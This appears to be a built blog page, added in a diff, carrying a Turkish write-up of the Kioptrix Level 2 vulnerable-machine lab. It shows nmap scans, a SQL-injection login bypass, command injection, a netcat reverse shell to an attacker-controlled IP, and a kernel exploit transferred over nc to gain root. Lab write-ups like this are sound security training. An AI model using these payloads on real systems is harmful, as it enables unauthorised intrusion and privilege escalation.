@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Kioptrix Level 2 Writeup</title>
+  <meta name="description" content="      Bu yazımda daha önce çözümünü yaptığım Kioptrix zafiyetli makinesinin ikinci aşamasının(Level II) çözümünü anlatacağım. Öncelikle sanal makinenin ağ üz...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/tr/2017/06/23/kioptrix-level-2.html">
+  <link rel="alternate" type="application/rss+xml" title="Hakan Bayır" href="http://localhost:4000/feed.xml">
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-101246969-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+</head>
+
+
+  <body>
+      <div class="outer">
+        <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hakan Bayır</a>
+    
+  </div>
+
+
+
+
+  <div class="header-badge">
+    <a href="/">
+        <img src="/assets/test.jpg" />
+    </a>
+  </div>
+
+    
+</header>
+
+
+        <div class="page-content">
+          <div class="wrapper">
+            <article class="post card" itemscope itemtype="http://schema.org/BlogPosting">
+ <div class="card-content">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Kioptrix Level 2 Writeup</h1>
+    <p class="post-meta"><time datetime="2017-06-23T00:00:00+03:00" itemprop="datePublished">Jun 23, 2017</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>      Bu yazımda daha önce çözümünü yaptığım Kioptrix zafiyetli makinesinin ikinci aşamasının(<code class="highlighter-rouge">Level II</code>) çözümünü anlatacağım. Öncelikle sanal makinenin ağ üzerinde aldığı ip adresini bulmak için <code class="highlighter-rouge">NMAP</code> ile genel ağ taraması yaptım.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -T4 192.168.1.0/24
+</code></pre></div></div>
+
+<p>      Bu tarama sonucunda ip adresini 192.168.1.40 olarak görüyoruz. Şimdi bu makine için açık port taraması yapacağız.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sV -T4 192.168.1.40 --open
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix2/hedef-tarama.png" /></p>
+
+<p>      Buradaki servisleri kullanarak farklı yollarla makineye sızma girişiminde bulunabiliriz. Açık olan <code class="highlighter-rouge">http</code> servisi benim dikkatimi çekti ve buradan nereye gidebileceğimi görmek için tarayıcıma makinenin ip adresini girerek yoluma devame ediyorum.</p>
+
+<p><img src="/img/kioptrix2/sqli.png" /></p>
+
+<p>      Böyle bir ekran beni karşılıyor. Burası çok net bir şekilde <code class="highlighter-rouge">SQLi</code> açığı bulunduran bir login ekranı. Her zaman kullandığım inject denemesi olarak hem Username hem Password için ‘or 1 or’ deniyorum ve farklı bir sayfaya yönlendiriliyorum.</p>
+
+<p>      Burası daha önce çözümünü yaptığım <code class="highlighter-rouge">DVWA Code Injection</code> bölümüne benziyor. Aynı mantıkla deneme amaçlı 127.0.0.1 &amp;&amp; echo “CTRL” yazıp gönderiyorum ve aşağıda yazan “CTRL” yazısından code injection yapabildiğimi anlıyorum.</p>
+
+<p><img src="/img/kioptrix2/code-injection.png" /></p>
+
+<p>      Bu aşamadan sonra nasıl bir code yollayıp hangi veriye ulaşsam ne işime yarar diye düşünmeye başladım. <code class="highlighter-rouge">nc</code> aracının içerideki yerini bulup servis üzerinde bir reverse shell başlatarak içeri sızmayı planladım. Sonra da gerekli exploiti bulup içeride root olmaya çalışacağım. nc aracının içerideki yerini bulmak için 127.0.0.1 &amp;&amp; find / -name nc komutunu içeriye yolluyorum.</p>
+
+<p><img src="/img/kioptrix2/find-nc.png" /></p>
+
+<p>      Tool’un yerini de bulduktan sonra <code class="highlighter-rouge">127.0.0.1  &amp;&amp; /usr/local/bin/nc 192.168.1.38 7777 -e '/bin/bash'</code> komutunu yollayarak reverse shell başlattım. Aynı zamanda kendi makinemden da nc ile dinleme açtım. Kodu yolladığımda bağlantı sağlandı.</p>
+
+<p><img src="/img/kioptrix2/reverse-shell.png" /></p>
+
+<p>      Diğer çözümdeki gibi dizinlerde dolanarak /var/mail/root dosyasına geldim ve bu uyarıyla karşılaştım.
+<code class="highlighter-rouge">"root: writable, regular file, no read permission".</code></p>
+
+<p><br />
+<img src="/img/kioptrix2/permission-denied.png" /></p>
+
+<p>      Apache kullanıcısı olduğum için gerekli izinlerim yok. Artık içeride root olmam gerekiyor. Root olmak için içeride bir exploit çalıştıracağım. Uygun exploit için <code class="highlighter-rouge">kernel</code> bilgisine bakıyorum.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uname -a 
+</code></pre></div></div>
+
+<p><img src="/img/kioptrix2/uname.png" /></p>
+
+<p>      Sistemde yüklü çekirdek versiyonu 2.6.9 olarak görünüyor. Buna uygun olacak kodu exploit-db’ de aratarak buldum. Sonra yine <code class="highlighter-rouge">nc</code> aracı ile karşı tarafa transfer ettim.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hedef için : /usr/local/bin/nc 192.168.1.38 8888 &gt; 9545.c
+Kendi makinem için : nc -lvp 8888 &lt; 9545.c
+</code></pre></div></div>
+
+<p>komutlarını girdim.</p>
+
+<p><img src="/img/kioptrix2/file-transfer.png" /></p>
+
+<p><br /><br />Sonra kodu çalıştırıp içeride root olmayı başardım.<br /><br /></p>
+
+<p><img src="/img/kioptrix2/root.png" /></p>
+
+<p>      Böylelikle Kioptrix Level II makinesininde çözümünü tamamlamış olduk. Özetle gerçekleştirdiğim aşamalar :</p>
+
+<p>1-  Port taraması sonucu açık olan http apache servisine giderek burada code injection gerçekleştirdim.<br />
+ 2-  Bu code injection sayesinde servise reverse shell başlattım.<br />
+ 3-  Reverse shell sayesinde karşıya exploit kodunu transfer ettim. <br />
+ 4-  Exploit kodunu çalıştırıp sistemde root yetkisi elde ettim.<br /></p>
+
+
+  </div>
+</div>
+</article>
+
+          </div>
+        </div>
+
+        <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <span class="footer-heading">Hakan Bayır</span>
+    <span class="footer-heading">2017 - 2018</span>
+
+  </div>
+
+</footer>
+
+      </div>
+  </body>
+  
+</html>
